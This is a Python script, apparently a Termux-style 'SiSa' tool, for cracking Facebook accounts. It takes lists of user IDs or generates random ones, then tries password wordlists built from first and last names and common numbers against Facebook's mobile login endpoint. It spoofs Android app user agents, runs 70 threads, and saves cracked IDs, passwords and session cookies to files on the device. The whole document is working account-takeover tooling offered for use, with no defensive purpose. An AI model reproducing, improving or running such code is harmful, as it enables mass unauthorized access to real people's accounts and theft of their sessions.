...
[sea_green1] ┃┏┓┃┗┛┃┃┃┃┃┳┻┓┓┃  ┃━━╋┃┃┫━━┫┏┓┃
[sea_green1] ┃┣┫┃┏┓┃┃┃┃┃┻┳┻┛┃  ┣━━┣┃┃╋━━┃┣┫┃
[sea_green1] ┗┛┗┻┛┗┻┻━┻┻━┻━━┛  ┗━━┻━━┻━━┻┛┗┛  [deep_pink2]{version}
{sort.line()}\n [red1][▶] [chartreuse1]Developer [orange3]▶  [chartreuse1]AHMED SISA\n [red1][▶] [light_green]Status    [orange3]▶  [medium_purple1][r]PRIVATE [/r]\n{sort.line()}'''
        print(aci)
...
def filee():
    sort.clear()
    sort.logo()
    print("[b][red1] [1] [sea_green2]Crack Indian File")
    print("[b][red1] [2] [spring_green1]Crack BD File")
    print(sort.line())
    ask=input("\x1b[38;1;196m\x1b[38;5;196m [▶] \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m ")
    if ask in ["1","01","a","A"]:
        ...
        print(sort.line())
        time.sleep(2)
        pwx=["first12","first123","first1234","first12345","first123456","firstlast","firstlast123","firstlast1234","first@123","first@","first@@","first@#","@first","@first@","firstlast12345","firstlast@#","firstlast@@","firstlast@","First123","First1234","first last","i love you","last123","last1234","name","name123","Name","firstlast12","FirstLast123","FirstLast1234","FirstLast@#","last@@@@"]
        ...
        time.sleep(2)
        filee()
    print("[b] [red1][▶] [chartreuse1]Example   [orange3]▶  [chartreuse1]/sdcard/IREEN.txt")
...
def file_sub(uid,pwx,name,meth,file):
    ...
    try:
        ...
        for pw in pwx:
            ...
            if meth in ["1","01","A","a"]:
                agent=['Dalvik/2.1.0 (Linux; U; Android 12; SM-A032F Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/439.0.0.29.119;FBPN/com.facebook.orca;FBLC/pt_PT;FBBV/548243055;FBCR/Unitel STP;FBMF/samsung;FBBD/samsung;FBDV/SM-A032F;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1459};FB_FW/1';],
            else:
                agent=userag2()
            data = {
            "adid": str(uuid.uuid4()),
            ...
            head = {
            'User-Agent': '[FBAN/Orca-Android;FBAV/58.0.0.4544;FBBV/4510103;[FBAN/FB4A;FBAV/90.0.0.20.70;FBBV/36474238;FBDM/{density=4.0,width=1200,height=1024};FBLC/en_US;FBRV/299560442;FBCR/Movicel;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7 Pro;FBSV/8.4.2;nullFBCA/armeabi-v7a:armeabi;]', 
            ...
            if "session_key" in po:
                ...
                print(f"\r\r[reverse white][SiSa-OK][/reverse white] [cyan]{uid} [white]|[/white][bright_red] {ps}     \n[white][🍪+[bold cyan]{str(len(oks))}[/bold cyan][white]][pale_green1]{coki} \n{sort.line()}")
                open("/sdcard/SiSa_file.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                break
...
def ran():
    ...
    with ThreadPool(max_workers=70) as heron:
        ...
        sort.logo()
        print(" [b][red1][▶] [chartreuse1]Total Uid [orange3]▶  [chartreuse1]"+str(len(user)))
        print(f" [b][red1][▶] [light_green]Code/Method   [orange3]▶  [light_green]{code}/M"+meth)
        print(sort.line())
        for xd in user:
            uid=code+xd
            if ask in ["1","01","a","A"]:
                ...
                pwx=[uid,uid[:6],uid[:7],uid[:8],xd,xd[1:],xd[2:],'sabbir','১২৩৪৫৬','708090','77889900','i love you',]
    ...
    try:
        ...
        for ps in pwx:
            ...
            if "session_key" in po:
                ...
                coki=";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f"\r\r[reverse white][SiSa-OK][/reverse white] [cyan]{uid} [white]|[/white][bright_red] {ps}     \n[white][🍪+[bold cyan]{str(len(oks))}[/bold cyan][white]][pale_green1]{coki} \n{sort.line()}")
                open("/sdcard/SiSa_random.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                break
            elif "Please Confirm Email" in str(po):
                oks.append(uid)
                uid=po["uid"]
...
def login(uid,meth):
    ...
    Session=requests.session()
    try:
        sys.stdout.write(f"\r\x1b[38;1;196m\x1b[38;0;196m└\033[38;5;46m[{sort.color()}SiSa-XD\033[38;5;46m]~[\x1b[1;97m{loop}-M{meth}\033[38;5;46m]-[\x1b[1;90mOK:{str(len(oks))}\033[38;5;46m] \r")
        sys.stdout.flush()
        for pw in ["123456","1234567","12345678","123456789"]:
            ...
            if "session_key" in rp:
                oks.append(uid)
                print(f"[b][bright_white]┝[red1]➤[spring_green1][[deep_pink2]OK[spring_green1]] [green_yellow]{uid} [red3]• [spring_green1]{pw}")
                open("/sdcard/SiSa_old.txt","a").write(uid+"|"+pw+"\n")
                break 
